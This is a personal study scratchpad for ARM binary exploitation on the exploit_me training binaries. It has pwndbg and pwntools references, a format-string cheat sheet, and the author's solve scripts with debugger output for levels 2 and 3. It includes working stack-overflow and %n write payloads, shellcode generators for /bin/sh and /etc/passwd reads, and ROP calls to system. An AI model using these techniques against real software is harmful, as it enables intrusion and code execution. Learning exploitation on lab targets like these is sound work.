## scratchpad - random notes

### ARM binary exploitation:

https://github.com/bkerler/exploit_me

#### Setup

From exploit_me/scripts/setup.sh:

```
#!/bin/sh
sudo apt-get update
sudo apt-get install -y git libssl-dev libffi-dev build-essential libncurses5-dev 
sudo apt-get install -y gcc-arm-linux-gnueabi g++-arm-linux-gnueabi
sudo apt-get install -y gcc-aarch64-linux-gnu g++-aarch64-linux-gnu
sudo apt-get install -y qemu qemu-user-binfmt binfmt-support
sudo systemctl restart systemd-binfmt
sudo apt-get install -y gdb-multiarch
sudo cp /usr/arm-linux-gnueabi/lib/ld-linux.so.3 /lib 
sudo cp /usr/arm-linux-gnueabi/lib/libgcc_s.so.1 /lib
sudo cp /usr/arm-linux-gnueabi/lib/libc.so.6 /lib
```

pwndbg install:

```
curl --proto '=https' --tlsv1.2 -LsSf 'https://install.pwndbg.re' | sh -s -- -t pwndbg-gdb
```

OR grab a release:

```
https://github.com/pwndbg/pwndbg/releases
```

pwntools:

```
python3 -m venv ./pwntools
cd pwntools
bin/python -m pip install --upgrade pip
bin/python -m pip install --upgrade pwntools
```

#### Analysis

```
file
strings
```

#### Debugging

From exploit_me/bin/arm for 32-bit:

```
#!/bin/sh
qemu-arm -g 1234 -L /usr/arm-linux-gnueabi $*
```

From exploit_me/bin/arm64 for 64-bit:

```
#!/bin/sh
qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu $*
```

Shell 1:
Execute the target binary - ready for remote debugging on port 1234:

```
./arm exploit
```

Shell 2:

```
pwndbg ./exploit
target remote localhost:1234
```

# Overall exploitation process

1. analyze next level's function in ghidra for an idea of what the challenge is
2. copy new pwntools script and based on function in ghidra, grab a target breakpoint address for debugging
3. format new pwntools script for level's args
4. debug/exploit

# pwndbg Quick Reference

Organized by task. Notes for AArch32/ARM targets called out where relevant.

---

## Context & state

| Command                                  | Does                                                   |
| ---------------------------------------- | ------------------------------------------------------ |
| `context` / `ctx`                    | Redraw the full context (regs, code, stack, backtrace) |
| `context reg code stack`               | Show only chosen panes                                 |
| `ctx-unset` / `set context-sections` | Configure which panes show                             |
| `regs`                                 | Registers (with symbol/deref annotations)              |
| `regs rax rbx`                         | Specific registers                                     |
| `aslr`                                 | Show/toggle ASLR (`aslr on/off`)                     |

## Running & stepping

| Command                             | Does                                         |
| ----------------------------------- | -------------------------------------------- |
| `start`                           | Break at entry (`main` if symbols) and run |
| `entry`                           | Break at real ELF entry point                |
| `ni` / `si`                     | Step over / into (instruction-level)         |
| `n` / `s`                       | Step over / into (source-level)              |
| `c`                               | Continue                                     |
| `nextcall` / `nextret`          | Run to next`call` / `ret`                |
| `nextsyscall`                     | Run to next syscall                          |
| `stepover` / `stepuntilasm mov` | Step until an asm pattern                    |

## Breakpoints

| Command                                    | Does                                      |
| ------------------------------------------ | ----------------------------------------- |
| `b *0x401234`                            | Break at absolute address                 |
| `b *$rebase(0x1234)`                     | Break at PIE offset (auto-adds load base) |
| `breakrva 0x1234`                        | Break at RVA in main binary               |
| `watch *0x...` / `rwatch` / `awatch` | Write / read / access watchpoint          |

## Memory inspection

| Command                        | Does                                            |
| ------------------------------ | ----------------------------------------------- |
| `x/32gx $rsp`                | Classic gdb examine (g=giant/8B, w=4B on ARM32) |
| `hexdump 0x... 128`          | Hex+ASCII dump                                  |
| `telescope $rsp 20`          | Recursive pointer-chase dump — the workhorse   |
| `stack 20`                   | `telescope` on the stack pointer              |
| `dq/dd/dw/db addr n`         | Dump as qword/dword/word/byte                   |
| `search -t bytes "\x90\x90"` | Search all mapped memory                        |
| `search -s "/bin/sh"`        | String search                                   |
| `p2p mapA mapB`              | Find pointers from region A into B              |

## Maps, layout, symbols

| Command                         | Does                                            |
| ------------------------------- | ----------------------------------------------- |
| `vmmap`                       | Memory map (perms, backing file)                |
| `vmmap heap` / `vmmap libc` | Filter by name                                  |
| `piebase`                     | PIE load base                                   |
| `libc` / `xinfo 0x...`      | Resolve an address (which map, offset, section) |
| `got` / `plt`               | Dump GOT / PLT                                  |
| `nearpc 0x...`                | Disassemble around an address                   |

## Heap (glibc)

| Command                                | Does                                        |
| -------------------------------------- | ------------------------------------------- |
| `heap`                               | Chunk listing for current arena             |
| `bins`                               | All bins (fast/tcache/small/large/unsorted) |
| `tcache` / `fastbins`              | Specific bin views                          |
| `top_chunk` / `arena` / `arenas` | Wilderness / arena state                    |
| `malloc_chunk 0x...`                 | Decode a single chunk header                |
| `find_fake_fast 0x...`               | Fastbin-attack target scanner               |
| `vis_heap_chunks`                    | Visual heap layout (great for UAF/overlap)  |

## Exploit-dev helpers

| Command                                  | Does                                               |
| ---------------------------------------- | -------------------------------------------------- |
| `cyclic 200`                           | De Bruijn pattern out                              |
| `cyclic -l 0x6161616c` (or `-l $pc`) | Offset lookup from crash value                     |
| `checksec`                             | Mitigations on the binary                          |
| `canary`                               | Locate/print the stack canary                      |
| `rop --grep "pop rdi"`                 | ROP gadget search (ropper/pwntools-backed)         |
| `ropgadget` / `jmpcall`              | Alt gadget finders                                 |
| `dumpargs`                             | Decode args at current call per calling convention |
| `plist` / `probeleak`                | Scan a region for leaked pointers                  |
| `errno`                                | Decode last errno                                  |

## Address arithmetic & offsets

gdb's expression evaluator underlies pwndbg, so you can subtract addresses directly.

| Command                                     | Does                                              |
| ------------------------------------------- | ------------------------------------------------- |
| `p 0xffffd050 - 0xffffd030`               | Subtract addresses → offset (decimal by default) |
| `p/x A - B` / `p/d A - B`               | Force hex / decimal output                        |
| `p $sp - $fp`                             | Registers work; untyped, no scaling               |
| `set $buf = 0x...` / `set $ret = 0x...` | Stash addresses as convenience vars               |
| `p/d ($ret - $buf)`                       | Reusable offset from stashed vars                 |
| `p ($ret - $buf) / 4`                     | Divide by element size (indexed-write index)      |
| `distance A B`                            | Delta in hex + decimal at once (if build has it)  |

**Pointer-scaling gotcha:** if either operand carries a pointer type, gdb divides the byte difference by `sizeof(*ptr)` automatically — `(int*)a - (int*)b` gives bytes/4, not bytes. Force a raw byte difference by casting both to `char*` or `long`:

```
p (long)&saved_ret - (long)&buf      # raw bytes, no scaling
p (char*)$reg_a - (char*)$reg_b       # same
```

Bare hex literals and registers are untyped integers, so `$sp - $fp` is plain math — the scaling surprise only appears when a symbol or typed cast is involved.

**Indexed-write offset workflow:** grab `buf` and the saved-LR slot from `telescope $sp`, stash both with `set`, then `p/d ($ret - $buf)` for the index — divide by element size if it's not a byte array. (For an offset derived from a crash rather than two known addresses, `cyclic -l <value>` is still the faster route.)

---

## Workflow notes

- `telescope` / `stack` are what you'll live in — they auto-deref and label, which beats raw `x/`.
- `cyclic -l $pc` (or `$lr` on ARM, since a stack smash often lands the pattern in the saved LR rather than PC) is the fast offset find.
- On AArch32 targets: use `w` width in `x/` (4-byte words), and remember `telescope` chases 4-byte pointers automatically once gdb knows the arch.
- ARM frame-reading: locals are addressed as fixed positive displacements off SP after the prologue reserves the frame (`sub sp, sp, #N`), so `str rX, [sp, #off]` is a spill to the local slot at `off`.

# pwntools Quick Reference

Exploit-dev / CTF reference. Covers `context`, I/O, packing, cyclic, GDB integration, shellcraft, and a worked template. ARM notes called out where relevant.

---

## Setup

```python
from pwn import *
```

That single import pulls in everything below: `context`, `remote`/`process`, `p32`/`u32`, `cyclic`, `asm`, `shellcraft`, `gdb`, `args`, `flat`, etc.

---

## context — set this first, everything reads from it

`context` is global state that packing, `asm`, `shellcraft`, and GDB all consult. Set it once at the top and the rest of the script inherits it.

```python
context.arch      = 'arm'        # 'amd64','i386','arm','aarch64','mips','thumb', ...
context.bits      = 32           # usually inferred from arch; override if needed
context.endian    = 'little'     # 'little' | 'big'
context.os        = 'linux'
context.log_level = 'info'       # 'debug' | 'info' | 'warning' | 'error'
context.terminal  = ['tmux', 'splitw', '-h']   # how gdb.debug() spawns a window
```

Common shorthand — set several at once:

```python
context.update(arch='arm', bits=32, endian='little', os='linux')
# or the binary sets arch/bits/endian for you:
context.binary = ELF('./target')     # exe = context.binary
```

| Field         | Purpose                                                                     |
| ------------- | --------------------------------------------------------------------------- |
| `arch`      | Drives`asm`, `shellcraft`, packing widths, GDB                          |
| `bits`      | 32/64; usually implied by`arch`                                           |
| `endian`    | Byte order for`p*`/`u*` and asm                                         |
| `os`        | Syscall/shellcraft target                                                   |
| `log_level` | Verbosity;`'debug'` prints every byte in/out                              |
| `terminal`  | Command used to open the GDB window (`tmux` split, or e.g. an x-terminal) |

**Terminal tip:** run the script inside a `tmux` session with `context.terminal = ['tmux','splitw','-h']` and `gdb.debug()` opens the debugger in a side pane. Without a working terminal set, GDB integration can't spawn a visible window.

---

## Logging & args (the DEBUG flag)

```python
# from the CLI, no code edits:
#   python exploit.py DEBUG            -> log_level = debug (byte trace)
#   python exploit.py LOG_LEVEL=warn   -> set explicitly
#   python exploit.py REMOTE           -> your own gate (see below)

if args.DEBUG:
    context.log_level = 'debug'

io = remote('host', 1337) if args.REMOTE else process('./target')
```

`args.NAME` is truthy when `NAME` is passed on the command line; `NAME=value` arrives as a string. `DEBUG` is special-cased to set debug logging automatically.

---

## Byte packing / formatting

```python
p32(0x41414141)          # -> b'\x41\x41\x41\x41'  (pack, uses context.endian)
p64(0xdeadbeef)          # 64-bit pack
u32(b'\x41\x41\x41\x41') # -> 0x41414141           (unpack)
u64(data)                # 64-bit unpack

p32(x, endian='big')     # override per-call
u32(data, sign=True)     # signed unpack

# leak handling: pad short leaks before unpacking
leak = io.recv(3)
addr = u32(leak.ljust(4, b'\x00'))
```

**flat / fit — build structured payloads without manual concatenation:**

```python
payload = flat(
    b'A' * 76,          # padding to saved PC
    p32(0x00010509),    # return address
    arg1, arg2,
)

# fit() places values at offsets, filling gaps with a cyclic pattern:
payload = fit({76: p32(ret_addr), 88: p32(arg)})
```

**ARM note:** null bytes in an address can't pass through argv/`strcpy`. If the address is the *last* thing in the buffer, `strcpy` writes the terminating null for you — send the address minus its trailing null. For a Thumb target set bit 0: `p32(addr | 1)`.

---

## cyclic — offset discovery

```python
cyclic(200)                  # De Bruijn pattern, 200 bytes
cyclic_find(0x6161616c)      # -> offset where that 4-byte value sits
cyclic_find(b'laaa')         # also accepts the raw bytes

# 64-bit: use 8-byte subsequences
cyclic(200, n=8)
cyclic_find(0x6161616161616166, n=8)
```

Workflow: send `cyclic(200)`, crash, take the value in the saved PC (or **LR on ARM**, where a stack smash often lands), `cyclic_find` it to get the padding length.

---

## I/O — send & receive

```python
io.send(data)            # raw bytes, NO newline
io.sendline(data)        # appends b'\n'  (watch this for corruption payloads)
io.sendafter(b'> ', data)      # recvuntil(delim) then send
io.sendlineafter(b'> ', data)  # the common prompt-driven pattern

io.recv(1024)            # up to n bytes
io.recvline()            # one line (through \n)
io.recvuntil(b'flag{')   # read until marker — deterministic sync
io.recvall(timeout=2)    # read to EOF/timeout — catches final flush on exit
io.clean()               # drain buffered data

io.interactive()         # hand off to you (drops to a shell / manual I/O)
```

**The teardown gotcha:** if output shows up under `interactive()` but not without it, the script is exiting before the target's final write is read. Replace `interactive()` with `recvall(timeout=2)` (or `recvuntil(marker)`) to read it explicitly. `recvall` waits for EOF, which is exactly when a libc-buffered program flushes on exit.

---

## GDB integration

```python
gdbscript = '''
break *0x00010500
break main
continue
'''

# launch under gdb (needs context.terminal working, e.g. inside tmux):
io = gdb.debug('./target', gdbscript=gdbscript)

# or attach to an already-running process:
io = process('./target')
gdb.attach(io, gdbscript=gdbscript)
pause()                          # hold the script so you can look before it sends

# point at a specific gdb (e.g. gdb-multiarch for ARM cross-debugging):
context.gdb_binary = 'gdb-multiarch'
```

| Piece                             | Purpose                                                    |
| --------------------------------- | ---------------------------------------------------------- |
| `gdb.debug(exe, gdbscript=...)` | Start the target under GDB from the start                  |
| `gdb.attach(io, gdbscript=...)` | Attach to a live`process`/`remote`                     |
| `gdbscript` (`gdb_commands`)  | Commands run at launch — breakpoints, layout, etc.        |
| `context.gdb_binary`            | Which GDB to invoke (`gdb-multiarch` for cross-arch/ARM) |
| `context.terminal`              | How the GDB window is spawned                              |

**Cross-arch:** for ARM binaries run under QEMU-user, `gdb.debug` wires up the QEMU gdbstub; set `context.gdb_binary='gdb-multiarch'` so the host GDB understands ARM. Pair with pwndbg for the richer `telescope`/`stack` views.

---

## asm / disasm

```python
context.arch = 'arm'
sc = asm('mov r0, #1')           # assemble -> bytes
print(disasm(sc))                # bytes -> listing

asm('nop')                       # arch-aware
```

---

## shellcraft — generated shellcode

```python
context.arch = 'arm'             # generator is arch-specific

sc  = shellcraft.sh()            # /bin/sh (as asm text)
sc  = shellcraft.execve('/bin/sh', 0, 0)
sc  = shellcraft.cat('/etc/passwd')
raw = asm(shellcraft.sh())       # assemble to raw bytes for the payload

# amd64 example:
context.arch = 'amd64'
raw = asm(shellcraft.amd64.linux.sh())
```

Namespaced by arch/os: `shellcraft.arm.linux.sh()`, `shellcraft.amd64.linux.execve(...)`, etc. When `context.arch`/`os` are set, the short forms resolve to the right variant. Output is assembly text — wrap in `asm()` to get bytes.

---

## Syscalls

```python
# via shellcraft (readable, arch-aware):
sc = shellcraft.syscall('SYS_execve', '/bin/sh', 0, 0)
sc = shellcraft.syscall('SYS_read', 0, buf, 100)
raw = asm(sc)

# constants are available directly:
print(constants.SYS_execve)      # arch-correct syscall number
print(constants.O_RDONLY)
```

`shellcraft.syscall(...)` emits the register setup + syscall/`svc` instruction for the current `context`. On ARM that's the `svc #0` convention with args in r0–r6 and the number in r7.

---

## ELF / ROP

```python
exe  = ELF('./target')
libc = ELF('./libc.so.6')

exe.symbols['main']              # symbol address
exe.got['puts']                  # GOT entry
exe.plt['system']                # PLT stub
exe.address = 0x10000            # rebase (PIE); symbols shift with it
next(exe.search(b'/bin/sh'))     # find bytes

rop = ROP(exe)
rop.raw(0x41414141)
rop.call('system', [next(exe.search(b'/bin/sh\x00'))])
rop.puts(exe.got['puts'])        # convenience: call puts(got_puts) to leak
print(rop.dump())                # inspect the chain
payload = rop.chain()            # -> bytes
```

---

## Worked template — local ARM stack overflow

```python
#!/usr/bin/env python3
from pwn import *

# --- context: set once, everything below inherits it ---
context.update(arch='arm', bits=32, endian='little', os='linux')
context.terminal   = ['tmux', 'splitw', '-h']
context.gdb_binary = 'gdb-multiarch'      # ARM under qemu-user
if args.DEBUG:
    context.log_level = 'debug'           # run: python exploit.py DEBUG

exe = context.binary = ELF('./target')

gdbscript = '''
break *0x00010500
continue
'''

def start():
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    if args.REMOTE:
        return remote('host', 1337)
    return process([exe.path])

io = start()

# --- offset discovery (run once, then hardcode) ---
# io.sendline(cyclic(200))
# io.wait(); core = io.corefile
# offset = cyclic_find(core.pc)          # or core.lr on ARM
# log.info('offset = %d', offset)

offset  = 76
ret_addr = 0x00010509                     # target gadget/function

# --- build payload ---
payload  = flat(
    b'A' * offset,
    p32(ret_addr),                        # trailing null handled by strcpy if last
)

# --- deliver ---
io.sendlineafter(b'> ', payload)

# --- read the result (do NOT rely on interactive() to flush) ---
print(io.recvall(timeout=2).decode(errors='replace'))

# io.interactive()   # use when you actually want a shell
```

Run modes:

```
python exploit.py            # local, quiet
python exploit.py DEBUG      # local, byte trace
python exploit.py GDB        # under gdb in a tmux split
python exploit.py REMOTE     # against the remote host
```

---

## Gotcha checklist

- **Output only appears under `interactive()`** → replace with `recvall(timeout=2)`; the script was exiting before the final flush was read.
- **`sendline` vs `send`** → the appended `\n` (`0x0a`) can corrupt a saved-PC value. Match exactly what reached the target.
- **"Inappropriate nulls in argv"** → argv/`execve` can't carry interior nulls; a *trailing* null is fine to drop (`strcpy` re-adds it if the address ends the buffer).
- **Thumb target** → set bit 0 on the address (`addr | 1`).
- **Offset from LR, not PC** → on ARM a stack smash frequently overwrites the saved LR; `cyclic_find(core.lr)`.
- **GDB window won't open** → run inside `tmux` and set `context.terminal`; for ARM set `context.gdb_binary='gdb-multiarch'`.

# Format String Exploitation Cheat Sheet

Practical workflow for FSB bugs, ARM32-focused (AArch32/ARMEL). Covers the bug, manual testing, the read/write primitives, and the pwntools automation. Notes where x86 differs.

---

## 0. The bug

A `printf`-family call where the **format argument is user-controlled** and there's no separate format string:

```c
printf(buf);              // vulnerable
fprintf(f, buf);
sprintf(dst, buf);
snprintf(dst, n, buf);
syslog(pri, buf);         // easy to miss
```

In the decompiler: the format parameter (`r0` for `printf`, `r1` for `fprintf`) is loaded from user input rather than pointing at a `.rodata` literal.

---

## 1. The ARM calling-convention fact that governs everything

AArch32 AAPCS passes the first four args in `r0–r3`. For `printf(fmt, ...)`:

```
r0 = format string
r1 = 1st vararg   -> printf arg position 1
r2 = 2nd vararg   -> position 2
r3 = 3rd vararg   -> position 3
[stack] = 4th vararg onward -> position 4, 5, 6, ...
```

A variadic function spills `r1–r3` into the stack save area to build its `va_list`. Consequence: `%1$`–`%3$` read the spilled registers (often nil/garbage); your controllable **stack** data starts appearing around position 4+. On x86 everything is on the stack from position 1 — so ARM effectively offsets your counting by the three register slots. Just count to your marker; the index already reflects this.

---

## 2. Manual testing — find your offset

Send a marker plus a sweep and see where it lands:

```
AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
```

Look for `0x41414141` in the output. Its position N = the arg index of your buffer.

Faster / deterministic — probe positions directly with `%N$p` instead of hand-counting:

```python
for i in range(1, 60):
    io = start()
    io.sendlineafter(b'prompt', b'AAAA' + f'%{i}$p'.encode())
    if b'0x41414141' in io.recvline():
        log.success('offset = %d', i); break
    io.close()
```

Use `AAAABBBB` (8-byte marker) to catch alignment splits — a misaligned buffer shows `0x41414141`/`0x42424242` straddling two positions.

**If the marker never appears anywhere (sweep to ~150):** your input is probably **not on the stack** (heap or global/BSS). The self-reference `%n` trick needs a stack-resident copy — go back to the decompiler and confirm where the buffer lives before proceeding.

---

## 3. Read primitives

| Specifier       | Effect                                                                   |
| --------------- | ------------------------------------------------------------------------ |
| `%p` / `%x` | Print a stack word (leak) — walk with many to dump the stack            |
| `%N$p`        | **Direct access:** read arg N without padding through earlier ones |
| `%N$s`        | Deref the pointer at N and print as string (**arbitrary read**)    |

**Read vs. pointer discriminator** (the gotcha): `%N$c`/`%N$p` print the *value* at slot N; `%N$s` *derefs* it. If `%N$p` shows a small value like `0x4e`, slot N **holds a byte** (`'N'`), not a pointer. If `%N$p` shows a real pointer and `%N$s` prints your target string, slot N **points at** it — that's your write slot.

**Harvest leaks** by classifying `%N$p` results:

- high stack-range value → stack address
- `.text`/code pointer → subtract known offset → **PIE base**
- libc pointer (`__libc_start_main+X` return, or a `0xfbad....` FILE flags word nearby) → **libc base**

---

## 4. Write primitive: `%n` family

`%n` writes the **count of characters printed so far** to the pointer at that arg position. Width variants limit the write size:

| Specifier | Writes             |
| --------- | ------------------ |
| `%n`    | 4 bytes (full int) |
| `%hn`   | 2 bytes (short)    |
| `%hhn`  | **1 byte**   |

**Controlling the value = controlling how much you print.** `%<W>c` prints one char padded to a field width of `W` → emits `W` characters → the counter reaches `W`.

- Write byte value `B` (1–255): `%Bc` before the `%hhn`.
- Write `0x00`: `%256c` (wraps: `256 & 0xFF = 0`).
- If a prefix already printed `P` chars: use `%(B-P)c` so the cumulative total is `B`.

The field-width number you type **equals** the output-character count **equals** the value written. That's the whole mechanism.

---

## 5. Worked one-byte example (what we did)

Goal: flip a byte from `'N'` (`0x4E`) to `'Y'` (`0x59` = **89**), where a **pointer to the N already sits on the stack**.

**Recon:**

```
%5$p   ->  a real pointer (not 0x4e)     : slot 5 is a pointer
%5$s   ->  prints "N"                    : it points AT the N
```

**Exploit (manual):**

```
%89c%5$hhn
```

- `%89c` prints 89 chars → counter = 89
- `%5$hhn` writes `89 = 0x59 = 'Y'` to `*(slot 5)`

One input, no leak, ASLR-immune — because the program itself resolves slot 5's pointer live every run. This is the right tool when a **pointer to the target already exists on the stack**.

---

## 6. The same write via pwntools

`fmtstr_payload` works differently: it **embeds the target address in your own buffer** and writes through that. So it needs (a) the literal target address and (b) your buffer's offset — it can *not* reuse an existing stack pointer.

```python
from pwn import *
context.update(arch='arm', endian='little')

payload = fmtstr_payload(offset, {target_addr: 0x59}, write_size='byte')
io.sendlineafter(b'prompt', payload)
print(repr(payload))     # inspect what it built
```

| Arg               | Meaning                                                                                                      |
| ----------------- | ------------------------------------------------------------------------------------------------------------ |
| `offset`        | The`%N$` index where **your buffer's first word** appears (from step 2). Anchor, not the write slot. |
| `{addr: value}` | Write`value` to `addr`. Multi-byte handled automatically.                                                |
| `write_size`    | `'byte'`=`%hhn`, `'short'`=`%hn` (usual sweet spot for full addresses), `'int'`=`%n`.            |

**Why the offset differs from the manual index:** `offset` is your *buffer's* anchor; pwntools then adds the words its own `%<W>c`/padding prefix occupies to place the address word, so the emitted `$` index shifts. In our case `offset=2` produced `%5$hhn` (2 + 3 prefix/alignment words = 5) — byte-identical to the manual payload, reached via a different coordinate system. Find `offset` empirically (where your marker lands), pass it, and let pwntools compute the final index. Always `print(repr(payload))` to verify.

**When to use which:**

- **Manual `%Bc%N$hhn`** — writing through a pointer **already on the stack** (randomized target, single input). `fmtstr_payload` can't express this.
- **`fmtstr_payload`** — writing a **known/static address** you supply yourself (GOT overwrite, global in a no-PIE binary), especially multi-byte writes where it handles the `%hhn` chunking, field-width bumps, and aligned address block for you.

---

## 7. Mitigations — check before building a `%n` chain

Run `checksec`. Each affects the write path:

| Finding                                         | Impact                                                                                                                                                                    |
| ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Partial RELRO**                         | GOT writable →**GOT overwrite** is the clean target                                                                                                                |
| **Full RELRO**                            | GOT read-only → pivot to saved**LR** on stack, `.fini_array`, exit handlers                                                                                      |
| **`__printf_chk` in imports** (FORTIFY) | `%n` in a writable-segment format usually **aborts**; non-contiguous `%N$` rejected. Reads still work; writes via `%n` often dead — confirm before investing |
| **PIE**                                   | GOT/`.text` targets need a leak first                                                                                                                                   |

---

## 8. Write targets, rough priority

GOT entry of a function called **after** the vulnerable `printf` (so the patched pointer is actually used) → saved **LR** on the stack → `.fini_array` / `__stack_chk_fail` GOT → (older glibc only) `__malloc_hook`/`__free_hook`.

---

## 9. Multi-byte writes (full address)

- Break the target value into byte or short chunks; write **ascending** positions with `%hhn`/`%hn`.
- Between chunks, raise the cumulative count with more `%Wc` padding to reach each successive target value.
- Place the **address block at the end** of the format string, 4-byte aligned, so `%N$` indices are deterministic. Pack with `p32`.
- Let pwntools do all of this: `fmtstr_payload(offset, {addr: value}, write_size='short')`.

---

## 10. ARM-specific placement gotchas

- **Alignment:** embedded address words must be 4-byte aligned or `%N$` points at a split of two addresses. Put them at the buffer tail.
- **Endianness:** ARMEL (little) is typical — `p32` + `context.endian`. ARMEB flips address byte order.
- **Thumb bit:** any code address you'll branch to needs bit 0 set (`addr | 1`).
- **ASLR / same-session rule:** a leaked randomized address (stack/PIE/libc) is valid **only within the process that produced it**. Leak and write in one session — a second run re-randomizes. Only static (no-PIE) targets survive across runs and can be hardcoded from recon.

---

## Quick workflow

```
1. Spot user-controlled format arg in decompiler
2. AAAA + %p sweep (or %N$p loop) -> find offset (marker index)
3. %N$p / %N$s -> classify pointers, get PIE/libc/stack bases
4. checksec -> pick writable target, confirm %n not FORTIFY-blocked
5. Pointer already on stack?  -> manual %Bc%N$hhn
   Supplying a known address?  -> fmtstr_payload(offset, {addr: val}, write_size=...)
6. Ensure overwritten function is called AFTER the printf
7. Fire; recvall(timeout=2) or interactive()
```

# pwntools template

```
#!/home/dvader/tools/pwntools/bin/python3

from pwn import *

context(arch='arm', bits=32, endian='little')
''' ### enter tmux before running ### '''
context.terminal = ["tmux", "splitw", "-h"]

#username = b'\x41'*12
#username = cyclic(32)
username = cyclic(cyclic_find(0x61616164))
#username += b'\x90' * 4
target_address = p32(0x112d4)
target_address.rstrip(b'\x00')
username += target_address

password = 'password'
binary_args = ['/home/dvader/exploit_me/bin/exploit', 'help', username, password]

gdb_commands = '''
set debuginfod enabled off
set exec-wrapper env -i
b *0x1160c
continue
'''

context.gdb_binary = "/usr/local/bin/pwndbg"
io = gdb.debug(binary_args, gdbscript=gdb_commands)

if args.INTERACTIVE:
    io.interactive()
else:
    print(io.recvall(timeout=1))


''' Learned (LX) '''

# L0 - 
# L1 - 
# L2 - 


''' Remembered (RX) '''

# R0 - 


''' To Do (TX) '''

# T0 - 

```

Run modes:

```
python exploit.py INTERACTIVE    # local, interactive debugging w/ set breakpoint
```

# exploit_me ARM binary - level 2:

```
#!/home/dvader/tools/pwntools/bin/python3

from pwn import *

context(arch='arm', bits=32, endian='little')
''' ### enter tmux before running ### '''
context.terminal = ["tmux", "splitw", "-h"]

#username = b'\x41'*12
username = cyclic(cyclic_find(0x61616164))
#username += b'\x90' * 4
target_address = p32(0x112d4)
target_address.rstrip(b'\x00')
print(target_address)
username += target_address

password = 'password'
binary_args = ['/home/dvader/exploit_me/bin/exploit', 'help', username, password]

gdb_commands = '''
set debuginfod enabled off
set exec-wrapper env -i
b *0x1160c
continue
'''

context.gdb_binary = "/usr/local/bin/pwndbg"
io = gdb.debug(binary_args, gdbscript=gdb_commands)

if args.INTERACTIVE:
    io.interactive()
else:
    print(io.recvall(timeout=1))

#binary = ELF('../exploit')


''' Learned (LX) '''
# can't add additional bytes in the buffer due to the null byte trick for the target address
# username += cyclic(33)
# L0 - learned that luckily since the target address is the last thing we're sending via our buffer,
# we can leverage the null byte trick/rstrip to strip the null byte from the original 000112d4 target address

# L1 - learned in ghidra there was a function to jump to that ghidra didn't disassemble correctly
# L2 - learned to use ghidra's "Create Function" to fixup the incorrect disassembly


''' Remembered (RX) '''
# R0 - remembered some of the other calls like recvall() to wait for exploit to run and finish


''' To Do (TX) '''

'''
└─$ level2/l2.py
b'\xd4\x12\x01\x00'
[+] Starting local process '/usr/bin/qemu-arm': pid 3029564
[*] running in new terminal: ['/usr/local/bin/pwndbg', '-q', '-x', '/tmp/pwnlib-gdbscript-swebtl8s.gdb']
[+] Receiving all data: Done (27B)
[*] Stopped process '/home/dvader/exploit_me/bin/exploit' (pid 3029564)
b'Level 3 Password: "Velvet"\n'
'''


```

# exploit_me ARM binary - level 3:

```
#!/home/dvader/tools/pwntools/bin/python3

from pwn import *

context(arch='arm', bits=32, endian='little')

if args.TMUX:
    ''' ### enter tmux before running ### '''
    context.terminal = ["tmux", "splitw", "-h"]


'''
#username = b'\x41'*12
#username = cyclic(32)
username = cyclic(cyclic_find(0x61616164))
#username += b'\x90' * 4
target_address = p32(0x112d4)
target_address.rstrip(b'\x00')
username += target_address
'''



arrayposition = '33'.encode()   # overwriting the return address here
value = '70756'
#value = p32(0xdeadbeef)            # doesn't seem to like p32(), however
# value of 11121314 == 0xa9b2a2 and resulted in invalid address 0xa9b2a2 successful LR overwrite
# calculated target address of 0x11464 == 70756 to hex to jump to next level password function

binary_args = ['/home/dvader/exploit_me/bin/exploit', 'Velvet', arrayposition, value]

gdb_commands = '''
set debuginfod enabled off
set exec-wrapper env -i
#b *0x114b0
continue
'''

context.gdb_binary = "/usr/local/bin/pwndbg"
io = gdb.debug(binary_args, gdbscript=gdb_commands)

if args.INTERACTIVE:
    io.interactive()
else:
    print(io.recvall(timeout=2))


''' Learned (LX) '''

# L0 - 
# L1 - 
# L2 - 


''' Remembered (RX) '''

# R0 - 


''' To Do (TX) '''

# T0 - 



'''
in ghidra:

void FUN_00011488(int param_1,undefined4 param_2)

{
  undefined4 auStack_88 [32];
  
  auStack_88[param_1] = param_2;
  FUN_0001e5e8_printf("filling array position %d with %d\n",param_1,param_2);
  return;
}
'''
'''
in pwndbg, stack before overwrite:

pwndbg> stack 36
00:0000│ sp  0x407ffcc0 —▸ 0x11464 ◂— push {r11, lr}
01:0004│     0x407ffcc4 ◂— 0x21 /* '!' */
02:0008│     0x407ffcc8 ◂— 0
... ↓        13 skipped
10:0040│     0x407ffd00 —▸ 0x7c438 ◂— 0xfbad2087
11:0044│     0x407ffd04 ◂— 1
12:0048│     0x407ffd08 ◂— 0
13:004c│     0x407ffd0c —▸ 0x408001aa ◂— '70756'
14:0050│     0x407ffd10 ◂— 0
15:0054│     0x407ffd14 —▸ 0x408001aa ◂— '70756'
16:0058│     0x407ffd18 —▸ 0x7c000 ◂— 0
17:005c│     0x407ffd1c ◂— 0x21 /* '!' */
18:0060│     0x407ffd20 ◂— 0x3e8
19:0064│     0x407ffd24 —▸ 0x407fffc4 —▸ 0x4080017c ◂— '/home/dvader/exploit_me/bin/exploit'
1a:0068│     0x407ffd28 —▸ 0x793b8 —▸ 0x104c5 ◂— movtne r7, #0x4a4a
1b:006c│     0x407ffd2c ◂— 0
1c:0070│     0x407ffd30 —▸ 0x407fffd8 —▸ 0x408001b0 ◂— 'COLORFGBG=15;0'
1d:0074│     0x407ffd34 ◂— 3
1e:0078│     0x407ffd38 —▸ 0x407ffe6c —▸ 0x1ceb5 ◂— mrceq p14, #7, r4, c12, c0, #7
1f:007c│     0x407ffd3c —▸ 0x1d887 ◂— ldrhteq r0, [sp], r0
20:0080│     0x407ffd40 ◂— 1
21:0084│     0x407ffd44 —▸ 0x7d150 —▸ 0x7a288 —▸ 0x62f6c ◂— andeq r0, r0, r3, asr #32 /* 'C' */
22:0088│     0x407ffd48 —▸ 0x407ffe6c —▸ 0x1ceb5 ◂— mrceq p14, #7, r4, c12, c0, #7
23:008c│ r11 0x407ffd4c —▸ 0x1196c ◂— mov r0, #0
'''
'''
pwndbg, after stack overwrite, where 0x11464 is the password for level 4 function:

pwndbg> stack 36
00:0000│ sp  0x407ffcc0 —▸ 0x11464 ◂— push {r11, lr}
01:0004│     0x407ffcc4 ◂— 0x21 /* '!' */
02:0008│     0x407ffcc8 ◂— 0
... ↓        13 skipped
10:0040│     0x407ffd00 —▸ 0x7c438 ◂— 0xfbad2087
